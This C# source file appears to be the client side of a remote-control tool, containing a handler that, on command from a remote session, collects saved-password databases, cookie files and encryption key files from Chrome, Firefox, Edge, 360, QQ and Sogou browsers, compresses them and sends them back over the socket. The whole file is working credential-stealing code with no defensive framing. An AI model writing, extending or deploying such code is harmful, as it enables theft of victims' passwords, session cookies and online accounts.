using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Text;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client.Handlers
{
    class RequestPasswordExtractHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            RunTaskThread(() =>
            {
                try
                {
                    var req = reqObj as RequestPasswordExtract;
                    var resp = new ResponsePasswordExtract();
                    resp.Passwords = new List<PasswordEntry>();

                    // 收集各浏览器Login Data文件
                    var dbFiles = new List<string>();
                    CollectBrowserFiles(dbFiles, req != null ? req.ExtractType : 0);

                    // 打包所有数据库文件
                    resp.RawDataZip = PackFiles(dbFiles);
                    resp.Result = true;
                    resp.Message = "提取完成,共" + dbFiles.Count + "个数据库文件";
                    session.Send(ePacketType.PACKET_PASSWORD_EXTRACT_RESPONSE, resp);
                }
                catch (Exception ex)
                {
                    var resp = new ResponsePasswordExtract();
                    resp.Result = false;
                    resp.Message = ex.Message;
                    session.Send(ePacketType.PACKET_PASSWORD_EXTRACT_RESPONSE, resp);
                }
            });
        }

        private void CollectBrowserFiles(List<string> files, int extractType)
        {
            string localApp = Environment.GetFolderPath(
                Environment.SpecialFolder.LocalApplicationData);
            string roamingApp = Environment.GetFolderPath(
                Environment.SpecialFolder.ApplicationData);

            if (extractType == 0 || extractType == 1)
            {
                // Chrome
                AddIfExists(files, Path.Combine(localApp,
                    @"Google\Chrome\User Data\Default\Login Data"));
                AddIfExists(files, Path.Combine(localApp,
                    @"Google\Chrome\User Data\Default\Cookies"));
                AddIfExists(files, Path.Combine(localApp,
                    @"Google\Chrome\User Data\Local State"));
            }

            if (extractType == 0 || extractType == 2)
            {
                // Firefox
                string ffDir = Path.Combine(roamingApp, @"Mozilla\Firefox\Profiles");
                if (Directory.Exists(ffDir))
                {
                    foreach (var dir in Directory.GetDirectories(ffDir))
                    {
                        AddIfExists(files, Path.Combine(dir, "logins.json"));
                        AddIfExists(files, Path.Combine(dir, "key4.db"));
                        AddIfExists(files, Path.Combine(dir, "cookies.sqlite"));
                    }
                }
            }

            if (extractType == 0 || extractType == 3)
            {
                // Edge
                AddIfExists(files, Path.Combine(localApp,
                    @"Microsoft\Edge\User Data\Default\Login Data"));
                AddIfExists(files, Path.Combine(localApp,
                    @"Microsoft\Edge\User Data\Default\Cookies"));
                AddIfExists(files, Path.Combine(localApp,
                    @"Microsoft\Edge\User Data\Local State"));
            }

            if (extractType == 0)
            {
                // 360浏览器
                AddIfExists(files, Path.Combine(localApp,
                    @"360Chrome\Chrome\User Data\Default\Login Data"));
                // QQ浏览器
                AddIfExists(files, Path.Combine(localApp,
                    @"Tencent\QQBrowser\User Data\Default\Login Data"));
                // 搜狗浏览器
                AddIfExists(files, Path.Combine(localApp,
                    @"SogouExplorer\User Data\Default\Login Data"));
            }
        }

        private void AddIfExists(List<string> files, string path)
        {
            if (File.Exists(path))
                files.Add(path);
        }

        private byte[] PackFiles(List<string> files)
        {
            using (var ms = new MemoryStream())
            using (var deflate = new DeflateStream(ms, CompressionMode.Compress))
            {
                foreach (string file in files)
                {
                    try
                    {
                        byte[] data;
                        using (var fs = new FileStream(file,
                            FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                        {
                            data = new byte[fs.Length];
                            fs.Read(data, 0, data.Length);
                        }

                        byte[] nameBytes = Encoding.UTF8.GetBytes(file);
                        byte[] nameLen = BitConverter.GetBytes(nameBytes.Length);
                        byte[] dataLen = BitConverter.GetBytes(data.Length);
                        deflate.Write(nameLen, 0, 4);
                        deflate.Write(nameBytes, 0, nameBytes.Length);
                        deflate.Write(dataLen, 0, 4);
                        deflate.Write(data, 0, data.Length);
                    }
                    catch { }
                }

                deflate.Close();
                return ms.ToArray();
            }
        }
    }
}
